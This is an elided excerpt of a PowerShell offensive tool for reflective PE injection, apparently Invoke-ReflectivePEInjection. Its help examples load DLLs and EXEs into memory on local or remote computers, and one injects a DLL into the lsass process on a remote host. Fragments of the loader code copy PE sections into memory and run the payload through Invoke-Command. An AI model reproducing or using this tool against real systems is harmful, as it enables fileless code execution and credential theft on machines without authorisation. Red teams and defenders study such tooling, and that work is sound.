...
$PBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-ReflectivePEInjection -PBytes $PBytes -FuncReturnType WString -ComputerName Target.local
.EXAMPLE
Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
    the wchar_t* returned by WStringFunc() from all the computers.
$PBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-ReflectivePEInjection -PBytes $PBytes -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)
.EXAMPLE
Load DemoEXE and run it locally.
$PBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-ReflectivePEInjection -PBytes $PBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"
.EXAMPLE
Load DemoEXE and run it locally. Forces ASLR on for the EXE.
$PBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-ReflectivePEInjection -PBytes $PBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR
.EXAMPLE
Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
$PBytes = [IO.File]::ReadAllBytes('DemoDLL_RemoteProcess.dll')
Invoke-ReflectivePEInjection -PBytes $PBytes -ProcName lsass -ComputerName Target.Local
.NOTES
GENERAL NOTES:
...
$RemoteScriptBlock = {
    ...
    Function Copy-Sections
    {
        ...
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            ...
            if ($SizeOfRawData -gt 0)
            {
                ...
                [System.Runtime.InteropServices.Marshal]::Copy($PBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
            }
    ...
    Function Invoke-MemoryLoadLibrary
    {
        ...
        [System.Runtime.InteropServices.Marshal]::Copy($PBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
        ...
        Copy-Sections -PBytes $PBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
...
Function Main
{
    ...
    $e_magic = ($PBytes[0..1] | ForEach-Object {[Char] $_}) -join ''
    ...
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
    }
    else
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
    }
}
